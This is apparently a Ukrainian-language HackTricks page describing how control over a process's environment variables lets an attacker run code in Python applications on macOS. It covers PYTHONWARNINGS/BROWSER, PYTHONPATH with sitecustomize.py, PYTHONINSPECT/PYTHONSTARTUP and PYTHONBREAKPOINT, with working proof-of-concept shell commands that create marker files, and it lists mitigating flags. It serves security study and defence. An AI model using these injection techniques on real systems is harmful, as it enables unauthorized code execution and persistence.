# Ін'єкція в застосунки Python у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PYTHONWARNINGS` і `BROWSER`

Якщо зловмисник може контролювати середовище процесу Python, поєднання `PYTHONWARNINGS` і `BROWSER` може спричинити виконання команд, коли Python імпортує модуль `antigravity` під час обробки спеціально сформованого параметра попередження. Ця техніка використовує те, що `antigravity` відкриває URL за допомогою модуля Python `webbrowser`, який враховує змінну середовища `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Через `PYTHONPATH` і `sitecustomize.py`

Під час звичайного запуску модуль Python `site` додає специфічні для сайту шляхи, а потім намагається імпортувати модуль із назвою `sitecustomize`. Якщо розмістити каталог, доступний для читання зловмисником, на початку `PYTHONPATH`, зловмисник, який контролює середовище процесу, може змусити Python імпортувати payload до цільового скрипту. Прапорець `-S` вимикає автоматичну ініціалізацію `site`, тоді як ізольований режим (`-I`) ігнорує `PYTHONPATH` і має на увазі `-s` та `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Для persistence через доступний для запису user site, а не успадкований `PYTHONPATH`, див. [файли запуску Python `.pth`, `.start` і `usercustomize`](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Через `PYTHONINSPECT` і `PYTHONSTARTUP` після виконання скрипту

У CPython 3.13+ скрипт, запущений із `PYTHONINSPECT=1`, після завершення переходить в інтерактивний сеанс. Якщо стандартний ввід є терміналом і доступний PyREPL, цей сеанс виконує файл, указаний у `PYTHONSTARTUP`, **після** цільового скрипту й перед появою запрошення. Тож зловмисник, який контролює обидві успадковані змінні та файл запуску, доступний для читання, може виконати код у цільовому процесі, не змінюючи його скрипт. Це тригер після виконання скрипту, а не звичайний хук запуску.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Ланцюжок не виконує файл запуску в старіших версіях CPython, за нетермінального стандартного вводу або коли `PYTHON_BASIC_REPL` примусово вмикає базовий REPL. Параметри `-E` і `-I` ігнорують змінні `PYTHON*`. Перш ніж покладатися на цей шлях, перевірте фактичний інтерпретатор і контекст термінала.<sup>[[3]](#references)[[5]](#references)</sup>

## Через `PYTHONBREAKPOINT`

Починаючи з Python 3.7 (PEP 553), вбудована функція `breakpoint()` імпортує та викликає те, на що вказує `sys.breakpointhook`; ціль береться зі змінної середовища **`PYTHONBREAKPOINT`** (`package.module.callable`). Імпорт зазначеного модуля та виклик функції виконуються ще до того, як зазвичай з’являється налагоджувач, тож зловмисник, який контролює середовище процесу, що викликає `breakpoint()` (це поширено в скриптах обслуговування й налагодження, а іноді такий виклик залишається у production-коді), отримує можливість виконати код.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

На відміну від `PYTHONWARNINGS`/`PYTHONPATH`, для цього цільовий процес має дійти до виклику `breakpoint()`, але це також працює лише завдяки **побічним ефектам імпорту** вказаного модуля (вкажіть будь-який модуль, доступний для імпорту, наприклад розміщений на початку `PYTHONPATH`, верхній рівень якого виконує код). Встановлення `PYTHONBREAKPOINT=0` повністю вимикає цей hook.



## References

- [1] [Злам за допомогою змінних середовища - elttam](https://www.elttam.com/blog/env/)
- [2] [site — хук конфігурації для конкретного сайту](https://docs.python.org/3/library/site.html)
- [3] [Командний рядок Python і середовище](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Вбудована функція breakpoint() і PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Диспетчеризація REPL інтерпретатора CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Виконання файлу запуску PyREPL у CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
